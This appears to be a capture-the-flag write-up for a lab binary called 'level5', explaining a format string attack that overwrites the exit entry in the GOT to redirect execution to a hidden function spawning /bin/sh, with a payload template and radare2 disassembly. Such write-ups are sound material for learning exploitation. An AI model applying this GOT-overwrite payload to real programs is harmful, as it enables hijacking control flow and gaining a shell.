There is a non-called "o" function

We should call this function using a format string attack

Search the position of our buffer

After the printf, there is an exit call. We can't rewrite EIP, the program will exit before

But we can replace the address of exit in the GOT with the address of "o", for calling it instead of exit

The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses

Get the address of exit in the GOT and the address of the "o" function

info function exit
info function o


Build the payload

"exit GOT address in little endian" + "o address in decimal - the 4 bytes of the exit GOT address" + "%?$n"

python -c 'print "`1arg`"+"%`2arg`d%`3arg`$n"'

```
[~]$ r2 level5
 -- Can you stand on your head?
[0x080483f0]> pxc
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
0x080483f0  31ed 5e89 e183 e4f0 5054 5268 9085 0408  1.^.....PTRh....  ; eip  ; [13] -r-x section size 476 named .text
0x08048400  6820 8504 0851 5668 0485 0408 e8cf ffff  h ...QVh........
0x08048410  fff4 9090 9090 9090 9090 9090 9090 9090  ................
0x08048420  5589 e553 83ec 0480 3d4c 9804 0800 753f  U..S....=L....u?  ; sym.__do_global_dtors_aux
0x08048430  a150 9804 08bb 4497 0408 81eb 4097 0408  .P....D.....@...
0x08048440  c1fb 0283 eb01 39d8 731e 8db6 0000 0000  ......9.s.......
0x08048450  83c0 01a3 5098 0408 ff14 8540 9704 08a1  ....P......@....
0x08048460  5098 0408 39d8 72e8 c605 4c98 0408 0183  P...9.r...L.....
0x08048470  c404 5b5d c38d 7426 008d bc27 0000 0000  ..[]..t&...'....
0x08048480  5589 e583 ec18 a148 9704 0885 c074 12b8  U......H.....t..  ; sym.frame_dummy
0x08048490  0000 0000 85c0 7409 c704 2448 9704 08ff  ......t...$H....
0x080484a0  d0c9 c390 5589 e583 ec18 c704 24f0 8504  ....U.......$...  ; sym.o
0x080484b0  08e8 fafe ffff c704 2401 0000 00e8 cefe  ........$.......
0x080484c0  ffff 5589 e581 ec18 0200 00a1 4898 0408  ..U.........H...  ; sym.n
0x080484d0  8944 2408 c744 2404 0002 0000 8d85 f8fd  .D$..D$.........
0x080484e0  ffff 8904 24e8 b6fe ffff 8d85 f8fd ffff  ....$...........
[0x080483f0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x080483f0]> s main
[0x08048504]> pdda
    ; assembly                           | /* r2dec pseudo code output */
                                         | /* level5 @ 0x8048504 */
                                         | #include <stdint.h>
                                         |  
    ; (fcn) main ()                      | int32_t main (void) {
    0x08048504 push ebp                  |     
    0x08048505 mov ebp, esp              |
    0x08048507 and esp, 0xfffffff0       |
    0x0804850a call 0x80484c2            |     n ();
    0x0804850f leave                     |
    0x08048510 ret                       |
                                         | }
[0x08048504]> s sym.n
[0x080484c2]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level5 @ 0x80484c2 */
                                                 | #include <stdint.h>
                                                 |
    ; (fcn) sym.n ()                             | int32_t n (void) {
                                                 |     char * format;
                                                 |     int32_t size;
                                                 |     FILE * stream;
    0x080484c2 push ebp                          |
    0x080484c3 mov ebp, esp                      |
    0x080484c5 sub esp, 0x218                    |
    0x080484cb mov eax, dword [0x8049848]        |     eax = stdin;
    0x080484d0 mov dword [esp + 8], eax          |     *((esp + 8)) = eax;
    0x080484d4 mov dword [esp + 4], 0x200        |     *((esp + 4)) = 0x200;
    0x080484dc lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484e2 mov dword [esp], eax              |
    0x080484e5 call 0x80483a0                    |     fgets (ebp);
    0x080484ea lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484f0 mov dword [esp], eax              |
    0x080484f3 call 0x8048380                    |     printf (eax);
    0x080484f8 mov dword [esp], 1                |
    0x080484ff call 0x80483d0                    |     return exit (1);
                                                 | }
[0x080484c2]> s sym.o
[0x080484a4]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level5 @ 0x80484a4 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.o ()                             | void o (void) {
    0x080484a4 push ebp                          |     
    0x080484a5 mov ebp, esp                      |     
    0x080484a7 sub esp, 0x18                     |
    0x080484aa mov dword [esp], 0x80485f0        |
    0x080484b1 call 0x80483b0                    |     system ("/bin/sh");
    0x080484b6 mov dword [esp], 1                |
    0x080484bd call 0x8048390                    |     return exit (1);
                                                 | }
[0x080484a4]>
```